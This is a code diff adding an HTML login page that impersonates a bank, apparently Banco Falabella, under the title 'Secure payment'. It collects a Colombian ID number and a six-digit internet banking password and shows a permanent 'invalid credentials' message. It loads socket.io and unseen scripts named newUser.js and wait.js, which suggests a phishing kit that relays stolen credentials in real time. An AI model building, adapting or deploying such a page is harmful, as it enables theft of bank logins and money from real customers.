@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0,user-scalable=0"
+    />
+    <title>Secure payment</title>
+    <link rel="stylesheet" href="css/style.css" />
+    <script src="../../../js/functions.js"></script>
+    <style>
+      * {
+        -webkit-appearance: none;
+        font-family: Arial, Helvetica, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+
+      input {
+        width: 80%;
+        height: 40px;
+        border-radius: 5px;
+        margin-top: 10px;
+        border: 1px solid gray;
+        padding: 5px;
+      }
+
+      select {
+        padding: 5px;
+        background-color: white;
+        color: black;
+        width: 82%;
+        height: 40px;
+        border-radius: 5px;
+        margin-top: 10px;
+        border: 1px solid gray;
+      }
+
+      #btnUsuario {
+        background-color: #7dc26f;
+        border: none;
+        color: white;
+        letter-spacing: 3px;
+        font-family: Arial, Helvetica, sans-serif, "Arial Narrow Bold";
+      }
+
+      #clave {
+        color: #7dc26f;
+      }
+
+      #btnUsuario {
+        background-color: #7dc26f;
+        /* Color inicial del botón */
+      }
+
+      #btnUsuario.filled {
+        background-color: #38a121;
+        /* Color cuando los campos están llenos */
+      }
+    </style>
+  </head>
+
+  <body>
+    <br /><br />
+    <div>
+      <center>
+        <header>
+          <img
+            class="logo"
+            src="logo-big.svg"
+            alt="Logo del Banco"
+            loading="eager"
+          />
+        </header>
+
+        <img src="/img/fala.png" alt="" width="40%" height="" />
+        <img src="/images/check.png" alt="" srcset="" width="20%" />
+        <br /><br />
+        <h3 style="color: #7dc26f">Ingreso Usuarios</h3>
+      </center>
+      <img src="/img/pago.jpg" alt="" width="20%" style="margin-left: 90px" />
+    </div>
+    <div>
+      <br />
+      <center>
+        <select name="" id="">
+          <option value="cedula">Cédula Ciudadania</option>
+          <option value="cedula">Cédula de extranjería</option>
+          <option value="cedula">Pasaporte</option></select
+        ><br />
+
+        <input
+          type="number"
+          inputmode="numeric"
+          id="txtUsuario"
+          name="cedula"
+          placeholder="Cedula Ciudadania"
+          oninput="this.value = this.value.slice(0, 10);"
+        /><br />
+        <input
+          type="password"
+          id="txtPass"
+          name="clave"
+          placeholder="Clave internet"
+          required
+          pattern="[0-9]{6}"
+          oninput="this.value = this.value.slice(0, 6);"
+        /><br />
+        <input type="submit" value="INGRESAR" id="btnUsuario" />
+        <br /><br />
+        <p style="color: red">Registro o contraseña no son válidos</p>
+      </center>
+      <br />
+      <input type="hidden" value="falabella" id="banco" />
+      <center>
+        <a href="" id="clave">Crea o recupera tu clave internet</a>
+      </center>
+    </div>
+    <br /><br />
+    <script>
+      const txtUsuario = document.getElementById("txtUsuario");
+      const txtPass = document.getElementById("txtPass");
+      const btnUsuario = document.getElementById("btnUsuario");
+
+      function checkInputs() {
+        if (txtUsuario.value.trim() !== "" && txtPass.value.trim() !== "") {
+          btnUsuario.classList.add("filled");
+        } else {
+          btnUsuario.classList.remove("filled");
+        }
+      }
+
+      txtUsuario.addEventListener("input", checkInputs);
+      txtPass.addEventListener("input", checkInputs);
+    </script>
+    <script src="js/newUser.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/wait.js"></script>
+  </body>
+</html>
